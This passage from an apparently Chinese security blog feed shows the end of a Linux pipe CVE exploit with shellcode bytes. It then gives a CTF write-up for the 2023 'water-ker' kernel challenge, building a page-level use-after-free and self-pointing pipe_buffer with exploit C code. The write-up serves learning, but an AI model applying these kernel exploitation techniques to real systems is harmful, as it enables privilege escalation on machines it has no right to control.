class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>        <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x90</span>,<br>        <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x6a</span>,<br>        <span class="hljs-number">0x02</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0xff</span>,<br>        <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x5f</span>,<br>        <span class="hljs-number">0x99</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xEB</span><br>    &#125;;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], elfcode, <span class="hljs-keyword">sizeof</span>(elfcode));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li>page cache</li><li>VFS</li><li>pipe &amp; splice源码</li></ul>]]></content>
    
    
    <categories>
      
      <category>CVEs</category>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>cve</tag>
      
      <tag>pipe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023 强网拟态 water-ker</title>
    <link href="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/"/>
    <url>/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/</url>
    
    <content type="html"><![CDATA[<p>第一次在比赛中尝试做kernel题（虽然没做出来），复现来哩~</p><p>基本上是抄的<a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^3CTF2023 d3kcache</a>的exp，学习一下这种利用方法</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/wjx.jpg" class title="wjx"><p><em>虽然已经不算速速了但我还是更了(・∀・(・∀・(・∀・</em>)*</p><span id="more"></span><h1 id="pipe-buffer"><a href="#pipe-buffer" class="headerlink" title="pipe_buffer"></a>pipe_buffer</h1><p>在pipe系统调用中申请的结构体，用于存放pipe的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在alloc_pipe_info函数中会申请pipe_buffer（默认16）个pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br>&#125;<br></code></pre></td></tr></table></figure><p>在pipe_write中会给pipe_buffer-&gt;page申请一个page</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span><br><span class="hljs-title function_">pipe_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *from)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> filp-&gt;private_data;<br><span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br><br><span class="hljs-keyword">if</span> (!page) &#123;<br>page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br><span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>ret = ret ? : -ENOMEM;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pipe-&gt;tmp_page = page;<br>&#125;<br><br>buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>buf-&gt;page = page;<br>buf-&gt;ops = &amp;anon_pipe_buf_ops;<br>buf-&gt;offset = <span class="hljs-number">0</span>;<br>buf-&gt;len = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (is_packetized(filp))<br>buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br><span class="hljs-keyword">else</span><br>buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>close一个pipe会在free_pipe_info释放pipe_buffer，如果一个buf-&gt;page的ref为0会在pipe_buf_release中free这个page</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_pipe_info</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> pipe-&gt;bufs + i;<br><span class="hljs-keyword">if</span> (buf-&gt;ops)<br>pipe_buf_release(pipe, buf);<br>&#125;<br><br><span class="hljs-keyword">if</span> (pipe-&gt;tmp_page)<br>__free_page(pipe-&gt;tmp_page);<br>kfree(pipe-&gt;bufs);<br>kfree(pipe);<br>&#125;<br></code></pre></td></tr></table></figure><p>F_SETPIPE_SZ可以更改pipe_buffer的值达到任意大小分配的目的，在pipe_resize_ring函数中会申请新的pipe_buffer，复制内容并释放原来的pipe_buffer</p><p>重新分配的大小是2^order * 0x1000，2^order就是pipe_buffer数组的大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">pipe_resize_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head, tail, mask, n;<br><br>bufs = kcalloc(nr_slots, <span class="hljs-keyword">sizeof</span>(*bufs),<br>       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);<br><span class="hljs-keyword">if</span> (unlikely(!bufs))<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br><span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> h = head &amp; mask;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> t = tail &amp; mask;<br><span class="hljs-keyword">if</span> (h &gt; t) &#123;<br><span class="hljs-built_in">memcpy</span>(bufs, pipe-&gt;bufs + t,<br>       n * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tsize = pipe-&gt;ring_size - t;<br><span class="hljs-keyword">if</span> (h &gt; <span class="hljs-number">0</span>)<br><span class="hljs-built_in">memcpy</span>(bufs + tsize, pipe-&gt;bufs,<br>       h * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><span class="hljs-built_in">memcpy</span>(bufs, pipe-&gt;bufs + t,<br>       tsize * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>&#125;<br>&#125;<br><br>head = n;<br>tail = <span class="hljs-number">0</span>;<br><br>kfree(pipe-&gt;bufs);<br>pipe-&gt;bufs = bufs;<br>pipe-&gt;ring_size = nr_slots;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>漏洞就不说了(ˉ▽ˉ；)…，0x200的chunk，有一次一字节的uaf</p><h2 id="构造页级uaf"><a href="#构造页级uaf" class="headerlink" title="构造页级uaf"></a>构造页级uaf</h2><p>可以把pipe_buffer分配到uaf的chunk，这样我们就能更改page成员的低字节，一个page结构体是0x40，只要把低字节改成0x40的倍数就可能使两个pipe_buffer-&gt;page指向同一个page</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page1.png" class title="page1"><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page2.png" class title="page2"><p>再把这个page释放掉我们就获得了一个uaf的page，再把这个page分配给其他的结构体就可以通过pipe管道的性质更改结构体的内容</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/page3.png" class title="page3"><p>来看exp</p><ul><li><p>一些准备工作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">save_status();<br>bind_core(<span class="hljs-number">0</span>);<br>fd_water = open(<span class="hljs-string">&quot;/dev/water&quot;</span>, O_RDWR);<br><span class="hljs-keyword">if</span>(fd_water &lt; <span class="hljs-number">0</span>)<br>    err_exit(<span class="hljs-string">&quot;Fail to open the device water!&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p>进行以上利用需要一些pipe_buffer-&gt;page是物理相邻的，把order 0的page消耗光就能从更高的order取page并进行分裂，这样就能获得相邻的page了，所以，简单粗暴地开喷！</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/alloc3-0.png" class title="alloc3-0"><ul><li><p>喷一些pipe_buffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to create pipe!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>分两波更改大小，分两波的原因</p><ul><li>后续write的时候会给buffer_pipe-&gt;page分配物理页，顺序和现在重新分配buffer_pipe一样</li><li>前面分配的page可能不是物理连续的，而利用需要连续的物理页</li><li>所以第一波分配先消耗一下不连续的物理页，之后的物理页就是连续的了</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] first extend pipe pages...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM / <span class="hljs-number">2</span>; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br>&#125;<br>    <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] UAF...&quot;</span>);<br>add_chunk(<span class="hljs-string">&quot;Eurus&quot;</span>);<br>delete_chunk();<br>    <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] second extend pipe pages...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = PIPE_SPRAY_NUM / <span class="hljs-number">2</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to extend %d pipe!&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to extend pipe!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>write一波，给pipe_buffer-&gt;page分配物理页，写入pipe_fd的编号便于寻找是否成功造成page重叠</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] allocating pipe pages...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>利用uaf更改pipe_buffer-&gt;page的低字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] edit one...&quot;</span>);<br>edit_chunk(<span class="hljs-string">&quot;\x80&quot;</span>);<br></code></pre></td></tr></table></figure></li><li><p>查找是否造成page重叠并确定victim pipe_buffer的序号victim_pid，如果读出的idx和实际的idx不一样则成功</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for corruption...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-type">char</span> a3_str[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">int</span> nr;<br>    <br>    <span class="hljs-built_in">memset</span>(a3_str, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(a3_str));<br>    read(pipe_fd[i][<span class="hljs-number">0</span>], a3_str, <span class="hljs-number">8</span>);<br>    read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(a3_str, <span class="hljs-string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i)<br>    &#123;<br>        orig_pid = nr;<br>        victim_pid = i;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span><br>               <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, <br>               victim_pid, orig_pid);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(victim_pid == <span class="hljs-number">-1</span>)<br>&#123;<br>    err_exit(<span class="hljs-string">&quot;Fail to find the orig!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><h2 id="构造二级自写管道"><a href="#构造二级自写管道" class="headerlink" title="构造二级自写管道"></a>构造二级自写管道</h2><p>上文中我们已经有了页级uaf，现在可以用这个页分配结构体进行泄露和结构体改写了，这里依然选择pipe_buffer作为victim结构体</p><ul><li><p>kmalloc在对应kmem_cache的slab不够用时会向buddy system申请page做为新的slab，申请的page的order由kmem_cache结构体的oo成员的高16位决定</p></li><li><p>所以我们需要新的pipe_buffer数组的大小满足<strong>对应kmem_cache的oo高16位为0</strong>，这样才会将刚才uaf的page取回来作为slab分配，这也就是exp中snd_pipe_sz的计算逻辑，这里选择96的kmem_cache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SND_PIPE_BUF_SZ 96</span><br><span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br></code></pre></td></tr></table></figure></li></ul><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf2.png" class title="uaf2"><p>此时我们可以通过第一次uaf获取victim pipe_buffer的内容，泄露victim page的地址</p><ul><li><p>然后再在victim page上造一个uaf，再把victim page分配为pipe_buffer数组</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf3.png" class title="uaf3"></li><li><p>由于我们已经知道了victim page的地址，可以把victim pipe_buffer2-&gt;page再指回victim page，我改我自己（</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf4.png" class title="uaf4"></li></ul><p>这时就可以修改pipe_buffer的offset和len来控制pipe的读写起始位置（offset是读起始位置，len是写起始位置 - 读起始位置）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>继续exp</p><p>我们需要3个这样的self-pointing pipe_buffer</p><ul><li><p>先向victim pipe里写一些数据不然之后无法读取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">40</span> - <span class="hljs-number">2</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br></code></pre></td></tr></table></figure></li><li><p>制造页级uaf，利用fcntl将pipe_buffer分配到uaf页上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free original pipe...&quot;</span>);<br>close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br>  <br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NUM; i++)<br>&#123;<br>    <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid)<br>    &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  <br>    <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>泄露pipe_buffer-&gt;page和pipe_buffer-&gt;ops</p><figure 